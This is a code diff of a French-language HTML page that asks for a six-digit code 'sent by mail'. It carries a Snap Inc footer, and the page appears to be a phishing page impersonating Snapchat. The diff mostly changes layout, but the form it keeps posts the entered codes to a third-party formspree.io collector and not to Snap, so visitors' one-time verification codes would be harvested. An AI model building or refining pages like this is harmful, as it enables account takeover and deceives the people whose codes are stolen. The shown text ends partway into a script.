@@ -5,15 +5,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Saisie du code</title>
   <style>
-    body {
-      background-color: #f9f9f9;
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
       font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+    body {
+      display: flex;
+      flex-direction: column;
+    }
+    .content {
+      flex: 1;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      margin: 0;
-      flex-direction: column;
     }
     .code-box {
       background: #fff;
@@ -22,7 +32,6 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
       max-width: 90%;
-      box-sizing: border-box;
     }
     h2 {
       margin-bottom: 20px;
@@ -30,14 +39,13 @@
     .code-inputs {
       display: flex;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
       margin-bottom: 20px;
-      flex-wrap: wrap;
     }
     .code-inputs input {
-      width: 40px;
-      height: 50px;
-      font-size: 24px;
+      width: 35px;
+      height: 45px;
+      font-size: 20px;
       text-align: center;
       border: 1px solid #ccc;
       border-radius: 5px;
@@ -56,10 +64,10 @@
       background-color: #e6d200;
     }
     footer {
-      margin-top: 30px;
+      text-align: center;
       font-size: 0.8em;
       color: #888;
-      text-align: center;
+      padding: 15px 10px;
     }
     img {
       display: block;
@@ -70,26 +78,28 @@
 </head>
 <body>
 
-<div class="code-box">
-  <img src="logo.jpg" alt="Logo">
-  <h2>Entrez votre code</h2>
+<div class="content">
+  <div class="code-box">
+    <img src="logo.jpg" alt="Logo">
+    <h2>Entrez votre code envoyé par mail</h2>
 
-  <form action="https://formspree.io/f/xzzrqevd" method="POST" id="codeForm">
-    <div class="code-inputs">
-      <input type="text" name="code1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-      <input type="text" name="code2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-      <input type="text" name="code3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-      <input type="text" name="code4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-      <input type="text" name="code5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-      <input type="text" name="code6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
-    </div>
-    <button type="submit">Envoyer</button>
-  </form>
-
-  <footer>
-    Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
-  </footer>
+    <form action="https://formspree.io/f/xzzrqevd" method="POST" id="codeForm">
+      <div class="code-inputs">
+        <input type="text" name="code1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+        <input type="text" name="code2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+        <input type="text" name="code3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+        <input type="text" name="code4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+        <input type="text" name="code5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+        <input type="text" name="code6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+      </div>
+      <button type="submit">Envoyer</button>
+    </form>
+  </div>
 </div>
+
+<footer>
+  Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
+</footer>
 
 <script>
   const inputs = document.querySelectorAll('.code-inputs input');
